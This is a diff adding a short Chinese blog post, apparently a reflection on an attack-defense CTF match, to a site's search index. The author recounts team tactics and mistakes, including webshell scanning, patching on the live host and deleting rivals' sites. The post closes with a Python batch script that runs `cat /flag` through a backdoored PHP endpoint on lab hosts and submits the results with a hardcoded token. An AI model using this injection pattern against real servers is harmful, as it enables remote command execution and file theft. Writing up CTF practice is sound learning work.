+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>在拿到网站的时候第一件事情就是改密码，由于我们这次是随机密码，被其他队猜到的可能性不大，所以就没有改，直接拖下源码，d盾扫一句话，进攻其他队，同时防御。我和我队友配合的比较好，他手提flag，我找洞修洞</p>
+<h2 id="转折"><a href="#转折" class="headerlink" title="转折"></a>转折</h2><p>后来学长也加进来了，我们的站就经常被删，这时候的心态就有点小炸，因为洞是在靶机上修的，每次把源码拖上去的时候就还是带漏洞，就搞不清楚那些洞修了哪些没修，没想到在本地先修在上传，最后就寄了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在优势的情况下，没有继续挖洞，修洞保持优势。删站的时候动作幅度太大，把整个文件夹都删了，容易被被删站的人发现。没有上流量监控脚本，看其他人打我们的exp从而进行反击</p>
+<p>附上批量脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot; http://172.17.135.39:&#123;&#125;/App/Api/nothing.php?a=system(&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">8001</span>,<span class="number">8010</span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">     url2=url.<span class="built_in">format</span>(i)</span><br><span class="line">     <span class="comment"># playload=&#123;&quot;a&quot;:&quot;system(&#x27;cat /flag&#x27;)&quot;&#125;</span></span><br><span class="line">     g=requests.get(url=url2)</span><br><span class="line">     flag=g.text</span><br><span class="line">     <span class="built_in">print</span>(flag)</span><br><span class="line">     url3=<span class="string">&#x27;http://172.17.135.26:19999/#/&#x27;</span></span><br><span class="line">     header=&#123;<span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;b67f4335dd35fc53718d46bef5be9361&#x27;</span>,<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">     flag=&#123;<span class="string">&#x27;flag&#x27;</span>:flag&#125;</span><br><span class="line">     y=requests.post(url=url3,headers=header,json=flag)</span><br><span class="line">     <span class="built_in">print</span>(y.text)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;no flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>awd</tag>
+      </tags>
   </entry>
 </search>
